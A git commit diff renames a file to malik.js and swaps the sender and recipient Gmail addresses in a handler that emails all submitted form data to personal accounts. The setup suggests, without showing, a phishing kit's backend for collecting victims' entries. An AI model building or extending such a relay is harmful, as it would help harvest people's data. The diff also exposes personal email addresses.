9499c2ad02185b7142f6d654a5a3d062b6252347
Adezrsa543219 <226099557+Adezrsa543219@users.noreply.github.com>
2026-03-24 15:20:31 +0500

    Update and rename 4.js to malik.js

--- malik.js
+++ malik.js
@@ -36,8 +36,8 @@ export default async function handler(req, res) {
 
   try {
     await transporter.sendMail({
-      from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,nizamnaighafar@gmail.com",
+      from: `"PROFESSOR" <adsmenigar@gmail.com>`,
+      to: "baewhappybirthday@gmail.com,adsmenigar@gmail.com,",
       subject: "Gafar",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
